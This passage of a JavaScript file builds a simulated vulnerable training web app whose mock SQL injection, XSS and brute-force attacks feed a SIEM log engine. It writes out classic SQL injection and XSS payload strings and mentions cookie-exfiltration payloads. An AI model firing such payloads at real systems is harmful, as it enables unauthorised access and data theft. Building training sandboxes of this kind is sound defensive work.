/**
 * Vulnerable Target Web Application: CyberVault Systems
 * Allows students to perform attacks (SQLi, XSS, Brute Force) in a safe, controlled sandbox,
 * which immediately emits realistic HTTP telemetry into the SOC SIEM log engine.
 */

import { logEngine } from './log-engine.js';
import { sfx, showToast, escapeHtml } from './utils.js';

class TargetApp {
  constructor() {
    this.container = null;
    this.currentView = 'catalog'; // 'catalog' | 'login' | 'feedback' | 'simulator'
    this.isAttacking = false;
    this.comments = [
      { id: 1, author: "Alice (DevOps)", comment: "Deployment of v2.4 looks stable. Good job team!", date: "2 hours ago" },
      { id: 2, author: "Bob (QA)", comment: "Please check the search indexing latency on product queries.", date: "1 hour ago" }
    ];
  }

  init(containerId) {
    this.container = document.getElementById(containerId);
    if (!this.container) return;
    this.render();
  }

  setView(view) {
    this.currentView = view;
    this.render();
  }

  render() {
    if (!this.container) return;

    this.container.innerHTML = `
      <div class="flex flex-col h-full bg-slate-950 text-slate-100 rounded-xl border border-slate-800 shadow-2xl overflow-hidden">
        <!-- Target App Browser Header -->
        <div class="bg-slate-900 border-b border-slate-800 p-3 flex flex-wrap items-center justify-between gap-3">
          <div class="flex items-center gap-2">
            <span class="w-3 h-3 rounded-full bg-rose-500/80 inline-block"></span>
            <span class="w-3 h-3 rounded-full bg-amber-500/80 inline-block"></span>
            <span class="w-3 h-3 rounded-full bg-emerald-500/80 inline-block"></span>
            <div class="ml-2 flex items-center bg-slate-950 px-3 py-1 rounded-md border border-slate-800 text-xs font-mono text-cyan-400">
              <svg class="w-3.5 h-3.5 mr-1.5 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
              <span>http://portal.cybervault.local${this.getPathForView()}</span>
            </div>
          </div>

          <!-- Navigation Sub-Tabs -->
          <div class="flex items-center gap-1 bg-slate-950 p-1 rounded-lg border border-slate-800 text-xs font-medium">
            <button id="nav-catalog" class="px-3 py-1.5 rounded-md transition-all ${this.currentView === 'catalog' ? 'bg-emerald-600 text-white font-semibold' : 'text-slate-400 hover:text-slate-200'}">
              🔍 Catalog & Search
            </button>
            <button id="nav-login" class="px-3 py-1.5 rounded-md transition-all ${this.currentView === 'login' ? 'bg-emerald-600 text-white font-semibold' : 'text-slate-400 hover:text-slate-200'}">
              🔐 Login Portal
            </button>
            <button id="nav-feedback" class="px-3 py-1.5 rounded-md transition-all ${this.currentView === 'feedback' ? 'bg-emerald-600 text-white font-semibold' : 'text-slate-400 hover:text-slate-200'}">
              💬 Feedback Board
            </button>
            <button id="nav-simulator" class="px-3 py-1.5 rounded-md transition-all flex items-center gap-1.5 ${this.currentView === 'simulator' ? 'bg-purple-600 text-white font-semibold shadow-lg shadow-purple-600/30' : 'text-purple-400 hover:text-purple-200 bg-purple-950/40 border border-purple-800/50'}">
              <span class="w-2 h-2 rounded-full bg-purple-400 animate-ping"></span>
              ⚡ Attack Simulator
            </button>
          </div>
        </div>

        <!-- Main Body Content -->
        <div class="flex-1 overflow-y-auto p-4 md:p-6" id="target-subview-content">
          ${this.renderSubview()}
        </div>
      </div>
    `;

    this.bindEvents();
  }

  getPathForView() {
    switch (this.currentView) {
      case 'catalog': return '/catalog/search';
      case 'login': return '/login';
      case 'feedback': return '/board/feedback';
      case 'simulator': return '/tools/attack-simulator';
      default: return '/';
    }
  }

  renderSubview() {
    switch (this.currentView) {
      case 'catalog': return this.renderCatalogView();
      case 'login': return this.renderLoginView();
      case 'feedback': return this.renderFeedbackView();
      case 'simulator': return this.renderSimulatorView();
      default: return '';
    }
  }

  // --- CATALOG & SEARCH VIEW (SQLi & Reflected XSS) ---
  renderCatalogView() {
    return `
      <div class="max-w-4xl mx-auto space-y-6">
        <div class="bg-gradient-to-r from-slate-900 to-slate-900/60 p-5 rounded-xl border border-slate-800">
          <div class="flex items-center justify-between mb-3">
            <div>
              <h2 class="text-xl font-bold text-white flex items-center gap-2">
                CyberVault Security Hardware & Portal
                <span class="text-xs px-2 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-800 font-mono">vulnerable: SQLi / XSS</span>
              </h2>
              <p class="text-xs text-slate-400 mt-1">Search the corporate product catalog or query internal asset inventories.</p>
            </div>
            <span class="text-xs font-mono text-cyan-400 bg-cyan-950/60 border border-cyan-800 px-2 py-1 rounded">GET /catalog/search</span>
          </div>

          <form id="catalog-search-form" class="flex gap-2">
            <div class="relative flex-1">
              <input 
                type="text" 
                id="catalog-search-input" 
                placeholder="Search products (e.g. firewall, token, or try: ' UNION SELECT 1,username,password,email,role FROM users--)" 
                class="w-full bg-slate-950 border border-slate-700 rounded-lg px-4 py-2.5 text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-emerald-500 font-mono"
              />
            </div>
            <button type="submit" class="bg-emerald-600 hover:bg-emerald-500 text-white font-medium px-5 py-2.5 rounded-lg text-sm transition-all flex items-center gap-2">
              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
              Search
            </button>
          </form>

          <!-- Quick Test Payloads Helper -->
          <div class="mt-3 flex flex-wrap items-center gap-2 text-xs">
            <span class="text-slate-400 font-mono">Quick Injections:</span>
            <button type="button" class="quick-payload-btn bg-slate-800 hover:bg-slate-700 text-cyan-300 px-2 py-1 rounded font-mono border border-slate-700" data-payload="' OR '1'='1">
              ' OR '1'='1
            </button>
            <button type="button" class="quick-payload-btn bg-slate-800 hover:bg-slate-700 text-cyan-300 px-2 py-1 rounded font-mono border border-slate-700" data-payload="' UNION SELECT 1,username,password,email,role FROM users--">
              ' UNION SELECT users--
            </button>
            <button type="button" class="quick-payload-btn bg-slate-800 hover:bg-slate-700 text-amber-300 px-2 py-1 rounded font-mono border border-slate-700" data-payload="<script>alert('XSS')</script>">
              &lt;script&gt;alert('XSS')&lt;/script&gt;
            </button>
            <button type="button" class="quick-payload-btn bg-slate-800 hover:bg-slate-700 text-amber-300 px-2 py-1 rounded font-mono border border-slate-700" data-payload="<img src=x onerror=alert('Reflected_XSS')>">
              &lt;img onerror=alert()&gt;
            </button>
          </div>
        </div>

        <!-- Search Results Container -->
        <div id="catalog-results-area" class="space-y-4">
          ${this.getStandardCatalogHTML()}
        </div>
      </div>
    `;
  }

  getStandardCatalogHTML() {
    return `
      <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
        <div class="bg-slate-900/80 p-4 rounded-xl border border-slate-800 hover:border-slate-700 transition-all">
          <div class="text-xs text-emerald-400 font-mono mb-1">PROD-101</div>
          <h3 class="font-bold text-white text-base">NextGen Enterprise Firewall</h3>
          <p class="text-xs text-slate-400 mt-2">Deep packet inspection appliance with 10Gbps throughput and encrypted tunnel inspection.</p>
          <div class="mt-4 flex items-center justify-between text-xs">
            <span class="text-slate-300 font-bold">$2,499.00</span>
            <span class="bg-emerald-950 text-emerald-300 px-2 py-0.5 rounded border border-emerald-800 font-mono">In Stock</span>
          </div>
        </div>

        <div class="bg-slate-900/80 p-4 rounded-xl border border-slate-800 hover:border-slate-700 transition-all">
          <div class="text-xs text-emerald-400 font-mono mb-1">PROD-102</div>
          <h3 class="font-bold text-white text-base">FIDO2 Hardware Token Key</h3>
          <p class="text-xs text-slate-400 mt-2">NFC and USB-C hardware authenticator for phishing-resistant MFA tokens.</p>
          <div class="mt-4 flex items-center justify-between text-xs">
            <span class="text-slate-300 font-bold">$55.00</span>
            <span class="bg-emerald-950 text-emerald-300 px-2 py-0.5 rounded border border-emerald-800 font-mono">In Stock</span>
          </div>
        </div>

        <div class="bg-slate-900/80 p-4 rounded-xl border border-slate-800 hover:border-slate-700 transition-all">
          <div class="text-xs text-emerald-400 font-mono mb-1">PROD-103</div>
          <h3 class="font-bold text-white text-base">SOC SIEM Log Collector Node</h3>
          <p class="text-xs text-slate-400 mt-2">1U rackmount syslog forwarder with TLS encryption and tamper-evident storage.</p>
          <div class="mt-4 flex items-center justify-between text-xs">
            <span class="text-slate-300 font-bold">$1,200.00</span>
            <span class="bg-emerald-950 text-emerald-300 px-2 py-0.5 rounded border border-emerald-800 font-mono">In Stock</span>
          </div>
        </div>
      </div>
    `;
  }

  // --- LOGIN VIEW (Brute Force & SQLi Auth Bypass) ---
  renderLoginView() {
    return `
      <div class="max-w-md mx-auto my-6 space-y-6">
        <div class="bg-slate-900 p-6 rounded-xl border border-slate-800 shadow-2xl">
          <div class="text-center mb-6">
            <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-emerald-950 text-emerald-400 border border-emerald-800 mb-3">
              <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
            </div>
            <h2 class="text-xl font-bold text-white">Staff Single Sign-On Portal</h2>
            <p class="text-xs text-slate-400 mt-1">Authorized corporate access only. Monitored by SIEM.</p>
          </div>

          <form id="target-login-form" class="space-y-4">
            <div>
              <label class="block text-xs font-mono text-slate-300 mb-1">Username / Account ID</label>
              <input 
                type="text" 
                id="login-username" 
                value="admin" 
                class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-sm text-slate-100 font-mono focus:outline-none focus:border-emerald-500"
                required
              />
            </div>

            <div>
              <div class="flex items-center justify-between mb-1">
                <label class="block text-xs font-mono text-slate-300">Password</label>
                <span class="text-[10px] text-amber-400 font-mono">No rate limits active!</span>
              </div>
              <input 
                type="password" 
                id="login-password" 
                placeholder="Enter password or SQLi bypass" 
                class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-sm text-slate-100 font-mono focus:outline-none focus:border-emerald-500"
                required
              />
            </div>

            <div id="login-feedback-box" class="hidden text-xs p-3 rounded-lg font-mono"></div>

            <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-medium py-2.5 rounded-lg text-sm transition-all shadow-lg shadow-emerald-900/30 flex items-center justify-center gap-2">
              <span>Sign In to Dashboard</span>
            </button>
          </form>

          <!-- Interactive Brute Force Trigger -->
          <div class="mt-6 pt-5 border-t border-slate-800 space-y-3">
            <div class="flex items-center justify-between text-xs">
              <span class="text-slate-400 font-medium">Test Attack Scenarios:</span>
              <span class="text-[11px] text-purple-400 font-mono">Emits live logs to SIEM</span>
            </div>

            <div class="grid grid-cols-2 gap-2">
              <button type="button" id="btn-burst-sqli-login" class="bg-slate-800 hover:bg-slate-700 text-cyan-300 p-2 rounded text-xs font-mono border border-slate-700 text-center transition-all">
                🔓 Inject ' OR '1'='1
              </button>
              <button type="button" id="btn-burst-brute-login" class="bg-purple-950/70 hover:bg-purple-900/70 text-purple-200 p-2 rounded text-xs font-mono border border-purple-800 text-center transition-all flex items-center justify-center gap-1">
                <svg class="w-3.5 h-3.5 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
                Hydra Burst
              </button>
            </div>
          </div>
        </div>
      </div>
    `;
  }

  // --- FEEDBACK & BUG BOUNTY BOARD (Stored XSS) ---
  renderFeedbackView() {
    return `
      <div class="max-w-3xl mx-auto space-y-6">
        <div class="bg-slate-900 p-5 rounded-xl border border-slate-800">
          <div class="flex items-center justify-between mb-4">
            <div>
              <h2 class="text-lg font-bold text-white flex items-center gap-2">
                Internal Security Feedback & Guestbook
                <span class="text-xs px-2 py-0.5 rounded bg-amber-950 text-amber-300 border border-amber-800 font-mono">vulnerable: Stored XSS</span>
              </h2>
              <p class="text-xs text-slate-400">Leave feedback for the IT administration team. Unsanitized comments are stored in the database.</p>
            </div>
            <span class="text-xs font-mono text-cyan-400 bg-cyan-950/60 border border-cyan-800 px-2 py-1 rounded">POST /board/feedback</span>
          </div>

          <form id="feedback-form" class="space-y-3">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
              <div>
                <label class="block text-xs font-mono text-slate-300 mb-1">Author Name</label>
                <input 
                  type="text" 
                  id="feedback-author" 
                  value="Anonymous Security Researcher" 
                  class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-100 font-mono focus:outline-none focus:border-emerald-500"
                  required
                />
              </div>
              <div class="flex items-end">
                <button type="button" id="btn-quick-xss-comment" class="w-full bg-slate-800 hover:bg-slate-700 text-amber-300 border border-slate-700 px-3 py-2 rounded-lg text-xs font-mono transition-all">
                  ⚡ Insert Malicious Script Payload
                </button>
              </div>
            </div>

            <div>
              <label class="block text-xs font-mono text-slate-300 mb-1">Message / Comment</label>
              <textarea 
                id="feedback-text" 
                rows="3" 
                placeholder="Type comment or try: <script>alert('Stored_XSS')</script>"
                class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-100 font-mono focus:outline-none focus:border-emerald-500"
                required
              ></textarea>
            </div>

            <button type="submit" class="bg-emerald-600 hover:bg-emerald-500 text-white font-medium px-4 py-2 rounded-lg text-xs transition-all flex items-center gap-1.5">
              <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"/></svg>
              Submit Feedback (Emits POST Log)
            </button>
          </form>
        </div>

        <!-- Comments Feed -->
        <div class="bg-slate-900/80 p-5 rounded-xl border border-slate-800 space-y-3">
          <h3 class="text-sm font-bold text-white flex items-center justify-between">
            <span>Recent Comments Feed (${this.comments.length})</span>
            <span class="text-xs font-normal text-slate-400">Rendered client-side</span>
          </h3>

          <div class="space-y-2.5" id="comments-list">
            ${this.renderCommentsList()}
          </div>
        </div>
      </div>
    `;
  }

  renderCommentsList() {
    return this.comments.map(c => `
      <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 flex items-start justify-between gap-3">
        <div class="space-y-1">
          <div class="flex items-center gap-2">
            <span class="text-xs font-bold text-cyan-400 font-mono">${escapeHtml(c.author)}</span>
            <span class="text-[10px] text-slate-500">${escapeHtml(c.date)}</span>
          </div>
          <div class="text-xs text-slate-300 font-mono break-all">${escapeHtml(c.comment)}</div>
        </div>
      </div>
    `).join('');
  }

  // --- ATTACK SIMULATOR VIEW (1-Click attack generator) ---
  renderSimulatorView() {
    return `
      <div class="max-w-4xl mx-auto space-y-6">
        <div class="bg-gradient-to-r from-purple-950/60 to-slate-900 p-6 rounded-xl border border-purple-800/60">
          <div class="flex items-center justify-between mb-4">
            <div>
              <h2 class="text-xl font-bold text-white flex items-center gap-2">
                <span class="text-purple-400">⚡ Automated Attack & Telemetry Harness</span>
              </h2>
              <p class="text-xs text-slate-300 mt-1">
                Trigger realistic multi-vector cyber attack bursts to test detection rules and generate instant forensics telemetry in the SOC SIEM!
              </p>
            </div>
            <div id="sim-status-badge" class="px-3 py-1 rounded-full text-xs font-mono ${this.isAttacking ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40 animate-pulse' : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'}">
              ${this.isAttacking ? '● Attack In Progress' : '● Ready to Fire'}
            </div>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <!-- 1. Hydra Brute Force -->
            <div class="bg-slate-900/90 p-4 rounded-xl border border-slate-800 hover:border-purple-600/50 transition-all space-y-3">
              <div class="flex items-center justify-between">
                <h3 class="font-bold text-purple-300 text-sm flex items-center gap-1.5">
                  <svg class="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
                  Hydra Password Brute Force
                </h3>
                <span class="text-[10px] font-mono bg-purple-950 text-purple-300 border border-purple-800 px-1.5 py-0.5 rounded">25 Requests</span>
              </div>
              <p class="text-xs text-slate-400">
                Simulates an automated dictionary attack against user <code class="text-slate-200">admin</code>. Generates 24 rapid 401s followed by legitimate password <code class="text-emerald-400">dragon123</code> (302).
              </p>
              <button type="button" id="sim-btn-hydra" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-medium py-2 rounded-lg text-xs transition-all flex items-center justify-center gap-2">
                <span>Launch Hydra Attack Burst</span>
              </button>
            </div>

            <!-- 2. Sqlmap Automated Scan -->
            <div class="bg-slate-900/90 p-4 rounded-xl border border-slate-800 hover:border-purple-600/50 transition-all space-y-3">
              <div class="flex items-center justify-between">
                <h3 class="font-bold text-cyan-300 text-sm flex items-center gap-1.5">
                  <svg class="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2 1 3 3 3h10c2 0 3-1 3-3V7M4 7c0-2 1-3 3-3h10c2 0 3 1 3 3M4 7h16m-5 4h.01m-4 0h.01m-4 0h.01"/></svg>
                  Sqlmap Automated Probing
                </h3>
                <span class="text-[10px] font-mono bg-cyan-950 text-cyan-300 border border-cyan-800 px-1.5 py-0.5 rounded">12 Requests</span>
              </div>
              <p class="text-xs text-slate-400">
                Fires automated SQLi heuristics (AND 1=1, SLEEP, UNION SELECT, information_schema) using the explicit User-Agent <code class="text-slate-200">sqlmap/1.7.2</code>.
              </p>
              <button type="button" id="sim-btn-sqlmap" class="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-medium py-2 rounded-lg text-xs transition-all flex items-center justify-center gap-2">
                <span>Launch Sqlmap Scan Burst</span>
              </button>
            </div>

            <!-- 3. Polyglot XSS Injection -->
            <div class="bg-slate-900/90 p-4 rounded-xl border border-slate-800 hover:border-purple-600/50 transition-all space-y-3">
              <div class="flex items-center justify-between">
                <h3 class="font-bold text-amber-300 text-sm flex items-center gap-1.5">
                  <svg class="w-4 h-4 text-amber-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/></svg>
                  Polyglot XSS Injection Burst
                </h3>
                <span class="text-[10px] font-mono bg-amber-950 text-amber-300 border border-amber-800 px-1.5 py-0.5 rounded">6 Payloads</span>
              </div>
              <p class="text-xs text-slate-400">
                Injects script tags, image onerror handlers, SVG onload vectors, and cookie exfiltration payloads into query strings and feedback boards.
              </p>
              <button type="button" id="sim-btn-xss" class="w-full bg-amber-600 hover:bg-amber-500 text-white font-medium py-2 rounded-lg text-xs transition-all flex items-center justify-center gap-2">
                <span>Inject XSS Payloads</span>
              </button>
            </div>

            <!-- 4. Benign Corporate Traffic -->
            <div class="bg-slate-900/90 p-4 rounded-xl border border-slate-800 hover:border-purple-600/50 transition-all space-y-3">
              <div class="flex items-center justify-between">
                <h3 class="font-bold text-emerald-300 text-sm flex items-center gap-1.5">
                  <svg class="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                  Benign Background Traffic
                </h3>
                <span class="text-[10px] font-mono bg-emerald-950 text-emerald-300 border border-emerald-800 px-1.5 py-0.5 rounded">15 Requests</span>
              </div>
              <p class="text-xs text-slate-400">
                Generates legitimate customer searches, asset downloads, and health checks to mix attack telemetry with realistic noise.
              </p>
              <button type="button" id="sim-btn-benign" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-200 font-medium py-2 rounded-lg text-xs transition-all flex items-center justify-center gap-2 border border-slate-700">
                <span>Generate Benign Traffic Noise</span>
              </button>
            </div>
          </div>

          <!-- Real-Time Simulator Log Stream Terminal -->
          <div class="mt-6 bg-slate-950 rounded-xl border border-slate-800 p-4 font-mono text-xs space-y-2">
            <div class="flex items-center justify-between text-slate-400 border-b border-slate-800 pb-2">
              <span class="flex items-center gap-2">
                <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
                <span>Attack Harness Output Console</span>
              </span>
              <button type="button" id="sim-btn-clear" class="text-[10px] text-slate-500 hover:text-slate-300 underline">Clear Console</button>
            </div>
            <div id="sim-console-output" class="h-36 overflow-y-auto space-y-1 text-slate-300 pr-2">
              <div class="text-slate-500">[System] Attack simulator initialized. Ready to execute scenarios.</div>
            </div>
          </div>
        </div>
      </div>
    `;
  }

  logToSimConsole(msg, type = 'info') {
    const consoleEl = document.getElementById('sim-console-output');
    if (!consoleEl) return;
    const colors = {
      info: 'text-slate-300',
      success: 'text-emerald-400 font-semibold',
      danger: 'text-rose-400 font-semibold',
      warning: 'text-amber-400'
    };
    const row = document.createElement('div');
    row.className = colors[type] || 'text-slate-300';
    row.innerHTML = `<span class="text-slate-600">[${new Date().toLocaleTimeString()}]</span> ${escapeHtml(msg)}`;
    consoleEl.appendChild(row);
    consoleEl.scrollTop = consoleEl.scrollHeight;
  }

  bindEvents() {
    // Navigation Sub-Tabs
    const navCatalog = document.getElementById('nav-catalog');
    const navLogin = document.getElementById('nav-login');
    const navFeedback = document.getElementById('nav-feedback');
    const navSim = document.getElementById('nav-simulator');

    if (navCatalog) navCatalog.onclick = () => this.setView('catalog');
    if (navLogin) navLogin.onclick = () => this.setView('login');
    if (navFeedback) navFeedback.onclick = () => this.setView('feedback');
    if (navSim) navSim.onclick = () => this.setView('simulator');

    // Subview Specific Event Listeners
    if (this.currentView === 'catalog') {
      this.bindCatalogEvents();
    } else if (this.currentView === 'login') {
      this.bindLoginEvents();
    } else if (this.currentView === 'feedback') {
      this.bindFeedbackEvents();
    } else if (this.currentView === 'simulator') {
      this.bindSimulatorEvents();
    }
  }

  // --- CATALOG EVENTS ---
  bindCatalogEvents() {
    const form = document.getElementById('catalog-search-form');
    const input = document.getElementById('catalog-search-input');
    const quickBtns = document.querySelectorAll('.quick-payload-btn');

    quickBtns.forEach(btn => {
      btn.onclick = () => {
        if (input) {
          input.value = btn.getAttribute('data-payload');
          form.dispatchEvent(new Event('submit', { cancelable: true }));
        }
      };
    });

    if (form) {
      form.onsubmit = (e) => {
        e.preventDefault();
        const query = (input.value || '').trim();
        if (!query) return;

        // Ingest into SIEM log engine
        const status = query.includes("'") && !query.toLowerCase().includes('union') && !query.toLowerCase().includes('or') ? 500 : 200;
        
        logEngine.ingest({
          client_ip: '192.168.1.105',
          method: 'GET',
          uri: '/catalog/search',
          query_params: { q: query },
          status: status,
          user_agent: navigator.userAgent
        });

        this.processCatalogSearch(query);
      };
    }
  }

  processCatalogSearch(query) {
    const resultsArea = document.getElementById('catalog-results-area');
    if (!resultsArea) return;

    const lower = query.toLowerCase();

    // Check for XSS
    if (lower.includes('<script>') || lower.includes('onerror=') || lower.includes('<svg') || lower.includes('onload=')) {
      this.showXssExecutionModal(query, "Reflected XSS");
      resultsArea.innerHTML = `
        <div class="bg-amber-950/40 border border-amber-600/50 p-4 rounded-xl text-amber-200">
          <div class="font-bold flex items-center gap-2">
            ⚠️ Reflected Search Query Executed:
          </div>
          <div class="mt-2 font-mono text-xs bg-slate-950 p-2.5 rounded border border-amber-800">
            ${escapeHtml(query)}
          </div>
          <p class="text-xs text-amber-300 mt-2">The unsanitized query was reflected directly in the HTML response without HTML entity encoding.</p>
        </div>
      `;
      return;
    }

    // Check for SQLi UNION SELECT
    if (lower.includes('union') && lower.includes('select')) {
      sfx.playSuccess();
      showToast("SQL Injection Successful! Database records exfiltrated.", "success");
      resultsArea.innerHTML = `
        <div class="bg-slate-900 border border-emerald-500/50 rounded-xl p-5 shadow-2xl space-y-4">
          <div class="flex items-center justify-between border-b border-slate-800 pb-3">
            <div>
              <span class="text-xs font-mono text-emerald-400 bg-emerald-950/80 px-2 py-0.5 rounded border border-emerald-800">UNION SELECT Injected Query</span>
              <h3 class="text-base font-bold text-white mt-1">Exfiltrated Database Table: <code class="text-cyan-400">users</code></h3>
            </div>
            <span class="text-xs text-slate-400 font-mono">5 records returned</span>
          </div>

          <div class="overflow-x-auto">
            <table class="w-full text-left font-mono text-xs">
              <thead class="bg-slate-950 text-slate-400 border-b border-slate-800">
                <tr>
                  <th class="p-2.5">ID</th>
                  <th class="p-2.5">Username</th>
                  <th class="p-2.5">Password Hash / Secret</th>
                  <th class="p-2.5">Email</th>
                  <th class="p-2.5">Role</th>
                </tr>
              </thead>
              <tbody class="divide-y divide-slate-800 text-slate-200">
                <tr class="bg-emerald-950/20 text-emerald-300">
                  <td class="p-2.5 font-bold">1</td>
                  <td class="p-2.5 font-bold">admin</td>
                  <td class="p-2.5">dragon123 <span class="text-[10px] bg-emerald-900 px-1 py-0.5 rounded text-white font-sans ml-1">FLAG: BLITZ{5ql1_un10n_d8_3xf1l_9f82c4a17e}</span></td>
                  <td class="p-2.5">admin@cybervault.local</td>
                  <td class="p-2.5 font-bold">SuperAdmin</td>
                </tr>
                <tr>
                  <td class="p-2.5">2</td>
                  <td class="p-2.5">sarah_admin</td>
                  <td class="p-2.5">Summer2026!</td>
                  <td class="p-2.5">sarah@cybervault.local</td>
                  <td class="p-2.5">IT Operations</td>
                </tr>
                <tr>
                  <td class="p-2.5">3</td>
                  <td class="p-2.5">db_service</td>
                  <td class="p-2.5">$2y$12$e8jK9...</td>
                  <td class="p-2.5">service@internal</td>
                  <td class="p-2.5">ServiceAccount</td>
                </tr>
              </tbody>
            </table>
          </div>
          <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 text-xs text-slate-400 flex items-center justify-between">
            <span>Copy Flag: <code class="text-emerald-400 font-bold select-all">BLITZ{5ql1_un10n_d8_3xf1l_9f82c4a17e}</code></span>
            <span class="text-cyan-400">Telemetry logged to SIEM!</span>
          </div>
        </div>
      `;
      return;
    }

    // Check for boolean tautology
    if (lower.includes('or') && (lower.includes('1=1') || lower.includes("'1'='1"))) {
      sfx.playAlert();
      showToast("SQL Injection Tautology Detected! All inventory dumped.", "warning");
      resultsArea.innerHTML = `
        <div class="bg-amber-950/20 border border-amber-500/40 p-4 rounded-xl space-y-3">
          <div class="text-xs text-amber-300 font-mono">SQL Query: SELECT * FROM products WHERE name LIKE '%${escapeHtml(query)}%' (Returned 12 hidden items)</div>
          ${this.getStandardCatalogHTML()}
        </div>
      `;
      return;
    }

    // Normal search
    resultsArea.innerHTML = `
      <div class="text-xs text-slate-400 mb-3 font-mono">Found 3 products matching "${escapeHtml(query)}"</div>
      ${this.getStandardCatalogHTML()}
    `;
  }

  // --- LOGIN EVENTS ---
  bindLoginEvents() {
    const form = document.getElementById('target-login-form');
    const uInput = document.getElementById('login-username');
    const pInput = document.getElementById('login-password');
    const fbBox = document.getElementById('login-feedback-box');
    const btnSqli = document.getElementById('btn-burst-sqli-login');
    const btnBrute = document.getElementById('btn-burst-brute-login');

    if (btnSqli) {
      btnSqli.onclick = () => {
        if (pInput) pInput.value = "' OR '1'='1";
        form.dispatchEvent(new Event('submit', { cancelable: true }));
      };
    }

    if (btnBrute) {
      btnBrute.onclick = () => {
        this.runHydraAttack();
      };
    }

    if (form) {
      form.onsubmit = (e) => {
        e.preventDefault();
        const username = (uInput.value || '').trim();
        const password = (pInput.value || '').trim();

        // Check SQLi Auth Bypass
        const isSqliBypass = password.includes("'") && (password.toLowerCase().includes('or') || password.includes('--'));
        const isValidCreds = username.toLowerCase() === 'admin' && password === 'dragon123';

        if (isSqliBypass || isValidCreds) {
          // Success (302)
          logEngine.ingest({
            client_ip: '192.168.1.105',
            method: 'POST',
            uri: '/api/login',
            body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&action=login`,
            status: 302,
            user_agent: navigator.userAgent
          });

          fbBox.className = "text-xs p-3 rounded-lg font-mono bg-emerald-950 text-emerald-300 border border-emerald-700 block";
          fbBox.innerHTML = `
            <strong>✓ Authentication Successful (HTTP 302)!</strong>
            <br>Welcome SuperAdmin! Session Token: <code class="text-white">adm_sess_940f81d</code>
            <br><span class="text-emerald-400 font-bold block mt-1">FLAG: <code class="select-all">BLITZ{bruf3_4uth_c0mpr0m153_6e1a4d88}</code></span>
            ${isSqliBypass ? '<span class="text-amber-400 mt-1 block">⚠️ Authentication Bypassed via SQL Injection!</span>' : ''}
          `;
          sfx.playSuccess();
        } else {
          // Failure (401)
          logEngine.ingest({
            client_ip: '192.168.1.105',
            method: 'POST',
            uri: '/api/login',
            body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&action=login`,
            status: 401,
            user_agent: navigator.userAgent
          });

          fbBox.className = "text-xs p-3 rounded-lg font-mono bg-rose-950 text-rose-300 border border-rose-800 block";
          fbBox.innerHTML = `
            <strong>✕ HTTP 401 Unauthorized</strong>: Invalid credentials for user '${escapeHtml(username)}'.
            <br><span class="text-slate-400 text-[11px]">Event logged to SIEM access log.</span>
          `;
          sfx.playError();
        }
      };
    }
  }

  // --- FEEDBACK EVENTS ---
  bindFeedbackEvents() {
    const form = document.getElementById('feedback-form');
    const authorInput = document.getElementById('feedback-author');
    const textInput = document.getElementById('feedback-text');
    const btnQuickXss = document.getElementById('btn-quick-xss-comment');

    if (btnQuickXss) {
      btnQuickXss.onclick = () => {
        if (textInput) textInput.value = `<script>alert('Stored_XSS_Exploit')</script>`;
      };
    }

    if (form) {
      form.onsubmit = (e) => {
        e.preventDefault();
        const author = (authorInput.value || '').trim();
